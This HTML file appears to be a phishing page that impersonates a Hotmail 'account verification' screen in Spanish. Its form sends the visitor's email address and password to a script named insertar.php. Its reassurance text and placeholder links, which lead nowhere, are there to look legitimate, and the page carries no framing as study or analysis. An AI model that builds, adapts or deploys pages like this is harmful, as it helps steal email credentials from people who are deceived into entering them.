<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="Description" content="Enter your description here" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.0/css/all.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <title>Hotmail</title>
    <style>
        #img_banner {
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        @media(min-width:1024px) {
            .form-control {
                width: 35%;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="row">
            <div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
                <br>
                <br>
                <br>
                <img src="banner.png" id="img_banner" class="img-fluid" />
                <h2 class="text-center mt-2">Verificar Cuenta</h2>
                <p class="text-center font-weight-400">Protegemos tu información.</p>
                <center><a href="#">¿Por qué es esto?</a>
                    <br>
                    <br>
                    <form action="insertar.php" method="post">
                        <input type="text" name="correo" class="form-control mb-2" placeholder="Correo electronico o numero">
                        <input type="password" name="pass" class="form-control mb-2" placeholder="Contraseña">
                        <input type="checkbox" class="mb-3"> Mantener sesión<br>
                        <button type="submit" class="btn btn-primary" style="width: 30%;">Ingresar</button>
                    </form>
                    <p>¿Por qué debo verificar? <a href="#"> Más información</a></p><br>
                    <a href="#">Olvidé mi contraseña</a><br>
                    <a href="#">Iniciar sesión usando el codigo de un solo uso</a>
                    <br>
                    <br>
                    <br>
                    <a href="#">Privacidad y Cookies</a> |
                    <a href="#">Terminos y condiciones</a>
                </center>

            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>

</html>